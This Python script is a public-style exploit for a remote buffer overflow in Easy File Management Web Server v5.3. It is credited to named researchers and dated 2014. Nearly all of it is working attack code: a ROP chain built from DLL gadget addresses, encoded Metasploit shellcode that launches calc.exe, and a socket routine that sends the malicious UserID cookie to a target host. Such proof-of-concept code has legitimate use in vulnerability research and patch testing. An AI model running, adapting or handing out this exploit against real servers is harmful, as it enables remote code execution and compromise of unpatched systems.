#!/usr/bin/python
# Exploit Title: Easy File Management Web Server v5.3 - USERID Remote Buffer Overflow (ROP)
# Version:       5.3
# Date:          2014-05-31
# Author:        Julien Ahrens (@MrTuxracer)
# Homepage:      https://www.rcesecurity.com
# Software Link: http://www.efssoft.com/
# Tested on:     WinXP-GER, Win7x64-GER, Win8-EN, Win8x64-GER
#
# Credits for vulnerability discovery:
# superkojiman (http://www.exploit-db.com/exploits/33453/)
#
# Howto / Notes:
# This scripts exploits the buffer overflow vulnerability caused by an oversized UserID - string as
# discovered by superkojiman. In comparison to superkojiman's exploit, this exploit does not 
# brute force the address of the overwritten stackpart, instead it uses code from its own 
# .text segment to achieve reliable code execution.

from struct import pack
import socket,sys
import os

host="192.168.1.26"
port=80

junk0 = "\x90" * 80

# Instead of bruteforcing the stack address, let's take an address
# from the .text segment, which is near to the stackpivot instruction:
# 0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll] 
# The memory located at 0x1001D8F0: "\x7A\xD8\x01\x10" does the job!
# Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
call_edx=pack('<L',0x1001D8C8) 

junk1="\x90" * 280
ppr=pack('<L',0x10010101) # POP EBX # POP ECX # RETN [ImageLoad.dll]

# Since 0x00 would break the exploit, the 0x00457452 (JMP ESP [fmws.exe]) needs to be crafted on the stack
crafted_jmp_esp=pack('<L',0xA445ABCF)

test_bl=pack('<L',0x10010125) # contains 00000000 to pass the JNZ instruction

kungfu=pack('<L',0x10022aac)  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0x1001a187) # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
kungfu+=pack('<L',0x1002466d) # PUSH EAX # RETN [ImageLoad.dll]

nopsled="\x90" * 20

# windows/exec CMD=calc.exe 
# Encoder: x86/shikata_ga_nai
# powered by Metasploit 
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'

shellcode=("\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab" +
"\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71" +
"\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09" +
"\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c" +
"\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e" +
"\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78" +
"\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22" +
"\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f" +
"\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28" +
"\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50" +
"\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4" +
"\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56" +
"\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56" +
"\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16" +
"\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea" +
"\xa5\x59\x50")

payload=junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + shellcode

buf="GET /vfolder.ghp HTTP/1.1\r\n"
buf+="User-Agent: Mozilla/4.0\r\n"
buf+="Host:" + host + ":" + str(port) + "\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf+="Accept-Language: en-us\r\n"
buf+="Accept-Encoding: gzip, deflate\r\n"
buf+="Referer: http://" + host + "/\r\n"
buf+="Cookie: SESSIONID=1337; UserID=" + payload + "; PassWD=;\r\n"
buf+="Conection: Keep-Alive\r\n\r\n"

print "[*] Connecting to Host " + host + "..."

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((host, port))
    print "[*] Connected to " + host + "!"
except:
    print "[!] " + host + " didn't respond\n"
    sys.exit(0)

print "[*] Sending malformed request..."
s.send(buf)

print "[!] Exploit has been sent!\n"
s.close()